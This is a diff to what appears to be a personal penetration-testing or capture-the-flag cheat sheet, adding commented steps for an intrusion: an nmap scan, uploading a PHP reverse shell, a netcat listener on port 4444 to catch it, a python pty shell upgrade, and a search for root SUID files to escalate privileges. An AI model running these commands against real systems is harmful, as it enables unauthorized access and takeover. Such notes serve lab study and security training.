@@ -69,14 +69,21 @@ sudo -l
 sudo nmap -sS -sV -oN nmap.log {target IP}
 
 # upload the reverse shell script
+# * on php file, it will be executed on click on file pages
 # https://github.com/pentestmonkey/php-reverse-shell
 
 # execute this script for upgrade the reverse shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 
+# recieve the reverse shell access
+# n: only IP, no DNS
+# v: verbose
+# l: listen
+# p: port
+nc -nvlp 4444
 
-find / -type f -user root -perm -4000 2>/dev/null
-
+# search SUID files
+# 2>/dev/null: waste errors
 find / -user root -perm /4000 -type f 2>/dev/null
 
 # escalate the priviledge
